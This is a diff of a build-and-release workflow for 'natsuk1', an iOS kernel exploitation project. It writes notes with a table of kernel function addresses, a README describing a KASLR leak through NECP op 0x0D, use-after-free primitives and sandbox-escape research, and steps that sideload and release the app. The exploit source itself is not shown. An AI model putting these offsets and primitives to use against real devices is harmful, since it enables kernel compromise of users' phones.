+          - Не спреить flow-struct обычными OOL/msg/socket.
+          - Не создавать NEXTHINT.txt / GHIDRA_HINTS.txt.
+          - Не коммитить natsuk1.xcodeproj (в .gitignore).
+          - Не вызывать `al_device_respring` — перезагружает телефон целиком.
+          - Не забывать `import Combine` там где `Timer.publish`.
+          - Не дублировать `StatusDot` / `LogTerminal`.
+          - Не читать 57 MB `__text` через getInt в цикле.
+          - Не использовать `exec` как имя переменной в Jython.
+          - Не доверять оффсетам без проверки в Ghidra.
+
+          ## 9. Полезные адреса
+
+          ```
+          necp_open                      0xFFFFFFF00A4E411C
+          necp_client_action             0xFFFFFFF00A4E5C28
+          necp_client_copy_result        0xFFFFFFF00A4E7BE8
+          necp_client_copy_result_inner  0xFFFFFFF00A4F26F0
+          necp_client_add_flow           0xFFFFFFF00A4E843C
+          necp_client_remove_flow        0xFFFFFFF00A4E93C4
+          necp_client_copy_interface     0xFFFFFFF00A4EAC7C
+          necp_client_sysctl_arena       0xFFFFFFF00A4EB704
+          necp_client_copy_update        0xFFFFFFF00A4EC264
+          necp_get_tlv_at_offset         0xFFFFFFF00A4C2034
+          copyin                         0xFFFFFFF00A368EC0
+          copyout                        0xFFFFFFF00A369A3C
+          kalloc_type                    0xFFFFFFF00A200988
+          kfree_type                     0xFFFFFFF00A201000
+          kalloc_type_necp_flow          0xFFFFFFF007C62E68
+          ```
+          EOF
+
+      # ============================================================
+      # 5. README.md
+      # ============================================================
+      - name: Write README.md
+        run: |
+          cat > README.md <<'EOF'
+          <p align="right">
+            <img align="right" height="140" src="natsuk1.png?raw=true"/>
+          </p>
+
+          # natsuk1
+
+          iOS 27.0 kernel research toolkit.
+
+          ![platform](https://img.shields.io/badge/platform-iOS%2027.0-blue)
+          ![arch](https://img.shields.io/badge/arch-arm64e-green)
+          ![device](https://img.shields.io/badge/device-iPhone14%2C5-lightgrey)
+          ![license](https://img.shields.io/badge/license-MIT-yellow)
+
+          ## Overview
+
+          Kernel-level research project targeting XNU on arm64e.
+
+          - KASLR leak via NECP sysctl arena (op=0x0D)
+          - Full NECP opcode map (0x01..0x1B)
+          - NECP UAF primitives with double-free confirmation
+          - Kernel offset database for iOS 27.0 / 24A437
+          - Remote pairing host (RPPairing) for sandbox-escape research
+          - Background keep-alive (silent audio + location)
+          - Crash-safe logging with recovery across sessions
+
+          ## Requirements
+
+          - iPhone with **iOS 27.0** (build 24A437)
+          - LocalDevVPN with interface `10.7.0.x`
+          - Sideload via AltStore / TrollStore / Sideloadly / Xcode
+
+          ## Install
+
+          Download the latest `natsuk1.ipa` from the [development release](../../releases/tag/development) and sideload it.
+
+          ## Build
+
+          ```
+          brew install xcodegen ldid
+          xcodegen generate
+          xcodebuild -project natsuk1.xcodeproj -scheme natsuk1 -configuration Release -sdk iphoneos
+          ```
+
+          ## Structure
+
+          ```
+          natsuk1/
+          ├── Exploit/         C primitives (NECP, KASLR leak, offsets)
+          ├── Helpers/         Swift bridges (pairing, MG, keep-alive)
+          ├── Offsets/         Versioned kernel offset DB
+          ├── Resources/       Info.plist, entitlements, assets
+          └── Views/           SwiftUI interface
+          ```
+
+          ## Notes
+
+          - All offsets are device/build specific. Verify before use.
+          - NECP kread: verified closed (no user-controlled pointer sinks).
+          - KASLR leak: NECP op=0x0D returns a kernel VA in user buffer.
+          - This is a research project, not a general-purpose jailbreak.
+
+          ## Credits
+
+          - [@flong69zxc-max](https://github.com/flong69zxc-max)
+          - [@murk-sus](https://github.com/murk-sus)
+          - [@eurogoth](https://t.me/eurogoth)
+          - [@asuka4scape](https://t.me/asuka4scape_developer)
+
+          ## License
+
+          MIT — see [LICENSE](LICENSE).
+          EOF
+
+      # ============================================================
+      # 6. Validate
+      # ============================================================
+      - name: Validate
         run: |
           set +e
           FAIL=0
-          S=natsuk1/Views/SettingsView.swift
-          F=natsuk1/Exploit/necp.c
           chk() {
             if eval "$2" >/dev/null 2>&1; then echo "  OK   $1"; else echo "  FAIL $1"; FAIL=1; fi
           }
 
-          echo "--- SettingsView ---"
-          chk "App exclamationmark.circle" "grep -q -e 'Label(\"App\", systemImage: \"exclamationmark.circle\")' $S"
-          chk "KeepAlive moon.stars"        "grep -q -e 'Label(\"Background Keep-Alive\", systemImage: \"moon.stars\")' $S"
-          chk "Options slider"              "grep -q -e 'Label(\"Options\", systemImage: \"slider.horizontal.3\")' $S"
+          chk "nk_offsets.h exists"      "test -s natsuk1/Exploit/nk_offsets.h"
+          chk "necp.c exists"            "test -s natsuk1/Exploit/necp.c"
+          chk "offsets json exists"      "test -s natsuk1/Offsets/iPhone14,5_iOS27.0_24A437.json"
+          chk "ai-hints.md exists"       "test -s ai-hints.md"
+          chk "readme exists"            "test -s README.md"
+          chk "no NEXTHINT"              "! test -f NEXTHINT.txt"
 
-          echo "--- necp.c ---"
-          chk "marker v26"                  "grep -q -e 'natsuk1-realcopy-v26' $F"
-          chk "copy_update note"            "grep -q -e 'necp_client_copy_update' $F"
-          chk "copy_interface note"         "grep -q -e 'necp_client_copy_interface' $F"
-          chk "kalloc_type note"            "grep -q -e 'kalloc_type' $F"
+          chk "kaslr marker in necp.c"   "grep -q -e 'kaslr_leak' natsuk1/Exploit/necp.c"
+          chk "sysctl arena in necp.c"   "grep -q -e 'NECP_SYSCTL_ARENA' natsuk1/Exploit/necp.c"
+          chk "nk_offsets kaslr"         "grep -q -e 'NK_NECP_SYSCTL_ARENA' natsuk1/Exploit/nk_offsets.h"
+          chk "op0x0D in json"           "grep -q -e 'off_necp_op_sysctl_arena' natsuk1/Offsets/iPhone14,5_iOS27.0_24A437.json"
 
-          echo "--- no NEXTHINT ---"
-          chk "no NEXTHINT.txt"             "! test -f NEXTHINT.txt"
-
-          echo "--- syntax ---"
-          SDK=$(xcrun --sdk iphoneos --show-sdk-path)
-          if clang -fsyntax-only -isysroot "$SDK" -arch arm64 -x c \
-              -I"$(pwd)/natsuk1/Exploit" -Wall -Wno-everything "$F" 2>&1; then
-            echo "  OK   clang necp.c"
-          else
-            echo "  FAIL clang necp.c"
-            FAIL=1
-          fi
+          python3 -c "import json; json.load(open('natsuk1/Offsets/iPhone14,5_iOS27.0_24A437.json'))" || FAIL=1
+          echo "  OK   json valid"
 
           if [ "$FAIL" -ne 0 ]; then echo "VERIFY FAILED"; exit 1; fi
           echo "VERIFY OK"
 
+      # ============================================================
+      # 7. Build
+      # ============================================================
       - name: Install tools
         run: brew install xcodegen ldid || true
 
@@ -229,27 +731,16 @@ jobs:
             OTHER_SWIFT_FLAGS="-Xfrontend -disable-dynamic-actor-isolation -Xfrontend -disable-actor-data-race-checks" \
             -UseModernBuildSystem=YES build -quiet
 
-      - name: Package app tarball
-        run: |
-          set -euo pipefail
-          APP_PATH="$(find build/Build/Products/Release-iphoneos -maxdepth 1 -name '*.app' -print -quit)"
-          [ -z "$APP_PATH" ] && { echo "no .app"; exit 1; }
-          tar -czf natsuk1-app.tar.gz -C "$(dirname "$APP_PATH")" "$(basename "$APP_PATH")"
-
-      - name: Upload app artifact
-        uses: actions/upload-artifact@v4
-        with:
-          name: natsuk1-app-tar
-          path: natsuk1-app.tar.gz
-          if-no-files-found: error
-          retention-days: 3
-
+      # ============================================================
+      # 8. Package + release
+      # ============================================================
       - name: Package and release
         env:
           GH_TOKEN: ${{ github.token }}
         run: |
           set -euo pipefail
           APP_PATH="$(find build/Build/Products/Release-iphoneos -maxdepth 1 -name '*.app' -print -quit)"
+          [ -z "$APP_PATH" ] && { echo "no .app"; exit 1; }
           ldid -Snatsuk1/Resources/natsuk1.entitlements "$APP_PATH/natsuk1"
           rm -rf Payload natsuk1.ipa
           mkdir -p Payload
@@ -262,36 +753,19 @@ jobs:
           IPA_URL="https://github.com/${REPO}/releases/download/development/natsuk1.ipa"
           ALTSTORE_URL="altstore://install?url=${IPA_URL}"
           SCARLET_URL="scarlet://install?url=${IPA_URL}"
-          ESign_URL="esign://install?url=${IPA_URL}"
+          ESIGN_URL="esign://install?url=${IPA_URL}"
 
           NOTES="$(cat <<EOF
           ### natsuk1 — iOS 27.0 (24A437)
 
-          **IPA direct link** (для Sideloadly / ESign / Scarlet / AltStore / TrollStore)
+          KASLR leak via NECP op=0x0D (sysctl arena).
 
-          \`\`\`
-          ${IPA_URL}
-          \`\`\`
+          **IPA** \`${IPA_URL}\`
 
-          **AltStore deep link**
+          AltStore: \`${ALTSTORE_URL}\`
+          Scarlet:  \`${SCARLET_URL}\`
+          ESign:    \`${ESIGN_URL}\`
 
-          \`\`\`
-          ${ALTSTORE_URL}
-          \`\`\`
-
-          **Scarlet deep link**
-
-          \`\`\`
-          ${SCARLET_URL}
-          \`\`\`
-
-          **ESign deep link**
-
-          \`\`\`
-          ${ESign_URL}
-          \`\`\`
-
-          Recent commits:
           $(git log -5 --pretty=format:'- %h %s')
           EOF
           )"
@@ -303,6 +777,9 @@ jobs:
             --latest=false \
             --notes "$NOTES"
 
+      # ============================================================
+      # 9. Commit
+      # ============================================================
       - name: Commit
         run: |
           set -euo pipefail
@@ -310,5 +787,5 @@ jobs:
           git config user.email "github-actions[bot]@users.noreply.github.com"
           git add -A
           if git diff --cached --quiet; then echo "no changes"; exit 0; fi
-          git commit -m "Settings icons + cleanup + sideload links [skip ci]"
+          git commit -m "KASLR leak + full NECP offsets + docs [skip ci]"
           git push
